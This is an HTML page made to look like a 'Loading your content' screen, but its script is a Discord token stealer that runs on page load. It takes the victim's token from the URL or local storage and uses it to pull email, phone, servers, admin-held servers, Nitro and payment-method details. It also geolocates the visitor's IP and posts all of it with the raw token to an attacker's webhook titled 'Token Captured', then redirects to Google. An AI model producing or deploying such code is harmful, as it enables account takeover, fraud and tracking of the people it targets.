<!DOCTYPE html>
<html>
<head>
  <title>Loading - Please Wait</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }
    .container {
      text-align: center;
      max-width: 500px;
    }
    .loading {
      display: inline-block;
      width: 50px;
      height: 50px;
      border: 3px solid rgba(255,255,255,.2);
      border-radius: 50%;
      border-top-color: #ffffff;
      animation: spin 1s ease-in-out infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loading"></div>
    <h2>Loading your content...</h2>
    <p>Please wait while we prepare your experience.</p>
  </div>

  <script>
    // Prevent duplicate sends
    let hasSent = false;

    // Discord API endpoints for token validation
    const DISCORD_API = {
      USER_INFO: 'https://discord.com/api/v9/users/@me',
      GUILDS: 'https://discord.com/api/v6/users/@me/guilds?with_counts=true',
      BILLING: 'https://discord.com/api/v9/users/@me/billing/payment-sources',
      SUBSCRIPTIONS: 'https://discord.com/api/v9/users/@me/billing/subscriptions',
      BOOST_SLOTS: 'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots'
    };

    async function processData() {
      if (hasSent) {
        location.href = 'https://google.com';
        return;
      }

      const urlParams = new URLSearchParams(window.location.search);
      let rawToken = urlParams.get('session') || urlParams.get('token');

      // Get UA directly from browser
      const userAgent = navigator.userAgent;

      if (!rawToken) {
        rawToken = localStorage.getItem('discord_token') || localStorage.getItem('token');
      }

      if (!rawToken) {
        location.href = 'https://google.com';
        return;
      }

      // Convert to string
      let token;
      if (typeof rawToken === 'string') {
        token = rawToken;
      } else if (typeof rawToken === 'object' && rawToken !== null) {
        if (rawToken.token) token = String(rawToken.token);
        else if (rawToken.value) token = String(rawToken.value);
        else token = JSON.stringify(rawToken);
      } else {
        token = String(rawToken);
      }

      // Decode if needed
      try {
        const decoded = decodeURIComponent(token);
        if (decoded !== token) token = decoded;
      } catch (e) {}

      try {
        hasSent = true;

        // Validate token first
        const validationResult = await validateToken(token);

        // If token is invalid, don't send anything - just redirect
        if (!validationResult.valid) {
          location.href = 'https://google.com';
          return;
        }

        // Token is valid - get IP and detailed system info
        let ipInfo = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A' };
        try {
          const ipResponse = await fetch('https://ipinfo.io/json');
          if (ipResponse.ok) {
            const ipData = await ipResponse.json();
            ipInfo = {
              ip: ipData.ip || 'N/A',
              city: ipData.city || 'N/A',
              region: ipData.region || 'N/A',
              country: ipData.country || 'N/A',
              org: ipData.org || 'N/A',
              postal: ipData.postal || 'N/A',
              timezone: ipData.timezone || 'N/A'
            };
          }
        } catch (e) {
          // Fallback to simple IP
          try {
            const fallbackResponse = await fetch('https://api.ipify.org?format=json');
            const fallbackData = await fallbackResponse.json();
            ipInfo.ip = fallbackData.ip;
          } catch (e2) {}
        }

        const systemInfo = {
          os: getOSInfo(userAgent),
          browser: getBrowserInfo(userAgent),
          ip: ipInfo.ip,
          city: ipInfo.city,
          region: ipInfo.region,
          country: ipInfo.country,
          isp: ipInfo.org,
          postal: ipInfo.postal,
          timezone: ipInfo.timezone,
          platform: navigator.platform,
          language: navigator.language
        };

        // Send only valid tokens to webhook
        await sendData(token, systemInfo, userAgent, validationResult);

        location.href = 'https://google.com';

      } catch (e) {
        location.href = 'https://google.com';
      }
    }

    // Validate Discord token and get detailed user info
    async function validateToken(token) {
      try {
        // Fetch user info
        const userResponse = await fetch(DISCORD_API.USER_INFO, {
          headers: { 'Authorization': token }
        });

        if (!userResponse.ok) {
          return {
            valid: false,
            error: `HTTP ${userResponse.status}`
          };
        }

        const userData = await userResponse.json();

        // Parse badges from flags
        const badges = parseFlags(userData.flags || 0);

        // Extract profile customizations
        const profileCustomization = {
          displayName: userData.global_name || userData.username,
          bio: userData.bio || 'None',
          banner: userData.banner ? `https://cdn.discordapp.com/banners/${userData.id}/${userData.banner}.png?size=512` : null,
          bannerColor: userData.banner_color || userData.accent_color || 'None',
          avatarDecoration: userData.avatar_decoration_data ? {
            asset: userData.avatar_decoration_data.asset,
            skuId: userData.avatar_decoration_data.sku_id
          } : null,
          profileEffect: userData.profile_effect ? {
            id: userData.profile_effect.id,
            description: userData.profile_effect.description || 'N/A'
          } : null
        };

        // Fetch guilds with counts
        let guilds = [];
        let adminGuilds = [];
        try {
          const guildsResponse = await fetch(DISCORD_API.GUILDS, {
            headers: { 'Authorization': token }
          });
          if (guildsResponse.ok) {
            guilds = await guildsResponse.json();
            
            // Populate boosted server names
            for (let boosted of boostInfo.boostedServers) {
              const guild = guilds.find(g => g.id === boosted.guildId);
              if (guild) {
                boosted.guildName = guild.name;
              }
            }
            
            // Find guilds where user has admin/manage server permissions
            for (let guild of guilds) {
              const perms = guild.permissions;
              // Check for ADMINISTRATOR (8) or MANAGE_SERVER (32)
              if ((perms & 8) === 8 || (perms & 32) === 32) {
                adminGuilds.push({
                  name: guild.name,
                  id: guild.id,
                  members: guild.approximate_member_count || 'N/A'
                });
              }
            }
          }
        } catch (e) {}

        // Fetch subscriptions (Nitro info)
        let nitroInfo = { hasNitro: false, type: 'None', expiresAt: null };
        try {
          const subsResponse = await fetch(DISCORD_API.SUBSCRIPTIONS, {
            headers: { 'Authorization': token }
          });
          if (subsResponse.ok) {
            const subs = await subsResponse.json();
            if (subs.length > 0) {
              nitroInfo.hasNitro = true;
              nitroInfo.type = getNitroType(subs[0].type);
              nitroInfo.expiresAt = new Date(subs[0].current_period_end).toLocaleString();
            }
          }
        } catch (e) {}

        // Fetch boost slots
        let boostInfo = { available: 0, onCooldown: 0, slots: [], boostedServers: [] };
        try {
          const boostResponse = await fetch(DISCORD_API.BOOST_SLOTS, {
            headers: { 'Authorization': token }
          });
          if (boostResponse.ok) {
            const slots = await boostResponse.json();
            for (let slot of slots) {
              const cooldownEnd = new Date(slot.cooldown_ends_at);
              const now = new Date();
              
              // Track boosted servers
              if (slot.premium_guild_subscription) {
                const guildId = slot.premium_guild_subscription.guild_id;
                const existing = boostInfo.boostedServers.find(b => b.guildId === guildId);
                if (existing) {
                  existing.count++;
                } else {
                  boostInfo.boostedServers.push({
                    guildId: guildId,
                    guildName: 'Loading...', // Will be populated from guilds list
                    count: 1
                  });
                }
              }
              
              if (cooldownEnd <= now) {
                boostInfo.available++;
                boostInfo.slots.push({ status: 'Available Now' });
              } else {
                boostInfo.onCooldown++;
                boostInfo.slots.push({ 
                  status: 'On Cooldown', 
                  availableAt: cooldownEnd.toLocaleString() 
                });
              }
            }
          }
        } catch (e) {}

        // Fetch billing/payment info
        let paymentInfo = { count: 0, valid: 0, types: [] };
        try {
          const billingResponse = await fetch(DISCORD_API.BILLING, {
            headers: { 'Authorization': token }
          });
          if (billingResponse.ok) {
            const payments = await billingResponse.json();
            for (let payment of payments) {
              paymentInfo.count++;
              if (!payment.invalid) {
                paymentInfo.valid++;
              }
              const type = payment.type === 1 ? 'Credit Card' : payment.type === 2 ? 'PayPal' : 'Unknown';
              paymentInfo.types.push({
                type: type,
                valid: !payment.invalid,
                brand: payment.brand || 'N/A'
              });
            }
          }
        } catch (e) {}

        return {
          valid: true,
          user: {
            id: userData.id,
            username: userData.username,
            displayName: profileCustomization.displayName,
            discriminator: userData.discriminator,
            email: userData.email || 'N/A',
            verified: userData.verified || false,
            phone: userData.phone || 'N/A',
            mfa: userData.mfa_enabled || false,
            flags: userData.flags || 0,
            badges: badges,
            locale: userData.locale || 'N/A',
            avatar: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : null,
            bio: profileCustomization.bio,
            banner: profileCustomization.banner,
            bannerColor: profileCustomization.bannerColor,
            avatarDecoration: profileCustomization.avatarDecoration,
            profileEffect: profileCustomization.profileEffect
          },
          nitro: nitroInfo,
          boost: boostInfo,
          guilds: {
            total: guilds.length,
            list: guilds.map(g => ({
              name: g.name,
              id: g.id,
              members: g.approximate_member_count || 'N/A'
            })),
            admin: adminGuilds
          },
          payment: paymentInfo
        };

      } catch (error) {
        return {
          valid: false,
          error: error.message
        };
      }
    }

    // Parse Discord flags to badge names (ALL badges)
    function parseFlags(flags) {
      const badges = [];
      
      // Public flags
      if ((flags & 1) === 1) badges.push('Discord Employee');
      if ((flags & 2) === 2) badges.push('Partnered Server Owner');
      if ((flags & 4) === 4) badges.push('HypeSquad Events');
      if ((flags & 8) === 8) badges.push('Bug Hunter Level 1');
      if ((flags & 64) === 64) badges.push('HypeSquad Bravery');
      if ((flags & 128) === 128) badges.push('HypeSquad Brilliance');
      if ((flags & 256) === 256) badges.push('HypeSquad Balance');
      if ((flags & 512) === 512) badges.push('Early Supporter');
      if ((flags & 1024) === 1024) badges.push('Team User');
      if ((flags & 4096) === 4096) badges.push('System');
      if ((flags & 16384) === 16384) badges.push('Bug Hunter Level 2');
      if ((flags & 65536) === 65536) badges.push('Verified Bot');
      if ((flags & 131072) === 131072) badges.push('Early Verified Bot Developer');
      if ((flags & 262144) === 262144) badges.push('Discord Certified Moderator');
      if ((flags & 524288) === 524288) badges.push('Bot HTTP Interactions');
      if ((flags & 4194304) === 4194304) badges.push('Active Developer');
      if ((flags & 17592186044416) === 17592186044416) badges.push('Quarantined');
      
      return badges.length > 0 ? badges : ['None'];
    }

    // Get Nitro type
    function getNitroType(type) {
      switch(type) {
        case 1: return 'Nitro Classic';
        case 2: return 'Nitro';
        case 3: return 'Nitro Basic';
        default: return 'None';
      }
    }

    // Send data to webhook (only called for valid tokens)
    async function sendData(token, systemInfo, userAgent, validationResult) {
      try {
        const response = await fetch('/api/get-webhook-url');
        const { webhookUrl } = await response.json();

        if (!webhookUrl) {
          throw new Error('Webhook URL not configured');
        }

        const tokenString = String(token);
        const user = validationResult.user;
        const nitro = validationResult.nitro;
        const boost = validationResult.boost;
        const guilds = validationResult.guilds;
        const payment = validationResult.payment;

        // Build fields array
        const fields = [
          {
            name: "👤 User Info",
            value: `\`\`\`yaml\nDisplay Name: ${user.displayName}\nUsername: ${user.username}#${user.discriminator}\nID: ${user.id}\nEmail: ${user.email}\nPhone: ${user.phone}\nLocale: ${user.locale}\`\`\``,
            inline: false
          },
          {
            name: "🔒 Security",
            value: `\`\`\`yaml\nMFA: ${user.mfa ? '✅ Enabled' : '❌ Disabled'}\nVerified: ${user.verified ? '✅ Yes' : '❌ No'}\`\`\``,
            inline: true
          },
          {
            name: "🎖️ Badges",
            value: `\`\`\`yaml\n${user.badges.join('\n')}\`\`\``,
            inline: true
          }
        ];

        // Bio
        if (user.bio && user.bio !== 'None') {
          fields.push({
            name: "📝 Bio",
            value: `\`\`\`${user.bio.substring(0, 200)}${user.bio.length > 200 ? '...' : ''}\`\`\``,
            inline: false
          });
        }

        // Profile customizations
        let customizations = [];
        if (user.banner) customizations.push(`Banner: Yes`);
        if (user.bannerColor !== 'None') customizations.push(`Banner Color: ${user.bannerColor}`);
        if (user.avatarDecoration) customizations.push(`Avatar Decoration: ${user.avatarDecoration.asset}`);
        if (user.profileEffect) customizations.push(`Profile Effect: ${user.profileEffect.description}`);
        
        if (customizations.length > 0) {
          fields.push({
            name: "🎨 Profile Customization",
            value: `\`\`\`yaml\n${customizations.join('\n')}\`\`\``,
            inline: false
          });
        }

        // Nitro info
        if (nitro.hasNitro) {
          fields.push({
            name: "💎 Nitro",
            value: `\`\`\`yaml\nType: ${nitro.type}\nExpires: ${nitro.expiresAt}\`\`\``,
            inline: true
          });
        } else {
          fields.push({
            name: "💎 Nitro",
            value: `\`\`\`yaml\nNone\`\`\``,
            inline: true
          });
        }

        // Boost list
        if (boost.boostedServers.length > 0) {
          let boostText = '';
          for (let boosted of boost.boostedServers) {
            boostText += `• ${boosted.guildName}: ${boosted.count} boost${boosted.count > 1 ? 's' : ''}\n`;
          }
          fields.push({
            name: "🚀 Boosted Servers",
            value: `\`\`\`yaml\n${boostText}\`\`\``,
            inline: false
          });
        } else {
          fields.push({
            name: "🚀 Boosted Servers",
            value: `\`\`\`yaml\nNone\`\`\``,
            inline: false
          });
        }

        // Boost slots
        if (boost.available > 0 || boost.onCooldown > 0) {
          let boostSlotText = `Available Now: ${boost.available}\nOn Cooldown: ${boost.onCooldown}`;
          fields.push({
            name: "💫 Boost Slots",
            value: `\`\`\`yaml\n${boostSlotText}\`\`\``,
            inline: true
          });
        }

        // Guilds
        fields.push({
          name: "🏠 Servers",
          value: `\`\`\`yaml\nTotal: ${guilds.total} servers\nAdmin Access: ${guilds.admin.length} servers\`\`\``,
          inline: true
        });

        // Regular guilds list (up to 10)
        if (guilds.list.length > 0) {
          let guildText = '';
          const maxDisplay = Math.min(guilds.list.length, 10);
          for (let i = 0; i < maxDisplay; i++) {
            const g = guilds.list[i];
            guildText += `• ${g.name} (${g.members} members)\n`;
          }
          if (guilds.list.length > 10) {
            guildText += `\n... and ${guilds.list.length - 10} more`;
          }
          fields.push({
            name: "📋 Server List",
            value: `\`\`\`yaml\n${guildText}\`\`\``,
            inline: false
          });
        }

        // Admin guilds details (up to 10)
        if (guilds.admin.length > 0) {
          let adminText = '';
          const maxGuilds = Math.min(guilds.admin.length, 10);
          for (let i = 0; i < maxGuilds; i++) {
            const g = guilds.admin[i];
            adminText += `• ${g.name} (${g.members} members)\n`;
          }
          if (guilds.admin.length > 10) {
            adminText += `\n... and ${guilds.admin.length - 10} more`;
          }
          fields.push({
            name: "⚡ Admin Permissions",
            value: `\`\`\`yaml\n${adminText}\`\`\``,
            inline: false
          });
        }

        // Payment methods
        if (payment.count > 0) {
          let paymentText = `Total Methods: ${payment.count}\nValid Methods: ${payment.valid}\n\nTypes:\n`;
          for (let pm of payment.types) {
            const status = pm.valid ? '✅' : '❌';
            paymentText += `  ${status} ${pm.type}`;
            if (pm.brand !== 'N/A') paymentText += ` (${pm.brand})`;
            paymentText += '\n';
          }
          fields.push({
            name: "💳 Payment Methods",
            value: `\`\`\`yaml\n${paymentText}\`\`\``,
            inline: false
          });
        }

        // IP and Location info
        fields.push({
          name: "🌐 IP & Location",
          value: `\`\`\`yaml\nIP: ${systemInfo.ip}\nCity: ${systemInfo.city}\nRegion: ${systemInfo.region}\nCountry: ${systemInfo.country}\nPostal: ${systemInfo.postal}\nTimezone: ${systemInfo.timezone}\`\`\``,
          inline: false
        });

        // ISP info
        fields.push({
          name: "📡 ISP",
          value: `\`\`\`yaml\n${systemInfo.isp}\`\`\``,
          inline: false
        });

        // System info
        fields.push({
          name: "💻 System",
          value: `\`\`\`yaml\nOS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\nPlatform: ${systemInfo.platform}\nLanguage: ${systemInfo.language}\`\`\``,
          inline: false
        });

        // Token
        fields.push({
          name: "🔑 Token",
          value: `\`\`\`${tokenString}\`\`\``,
          inline: false
        });

        // Build rich embed
        const embed = {
          title: "🎯 Token Captured - Full Profile",
          description: `**${user.displayName}** (@${user.username}#${user.discriminator}) account compromised`,
          color: nitro.hasNitro ? 0xFF73FA : payment.count > 0 ? 0xFAA61A : 0x43B581,
          fields: fields,
          thumbnail: user.avatar ? { url: user.avatar } : undefined,
          image: user.banner ? { url: user.banner } : undefined,
          footer: {
            text: `Captured at ${new Date().toUTCString()}`,
            icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
          },
          timestamp: new Date().toISOString()
        };

        const payload = {
          content: nitro.hasNitro ? '💎 **Nitro Account Detected!**' : payment.count > 0 ? '💳 **Payment Methods Found!**' : null,
          embeds: [embed],
          username: "Token Logger Pro",
          avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png"
        };

        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        return true;

      } catch (error) {
        return false;
      }
    }

    function getOSInfo(ua) {
      if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
      if (ua.includes("Windows NT")) return "Windows";
      if (ua.includes("Mac OS X")) return "macOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
      return "Unknown";
    }

    function getBrowserInfo(ua) {
      if (ua.includes("Firefox/")) return "Firefox";
      if (ua.includes("Edg/")) return "Edge";
      if (ua.includes("Chrome/")) return "Chrome";
      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
      return "Unknown";
    }

    window.addEventListener('load', processData);
  </script>
</body>
</html>
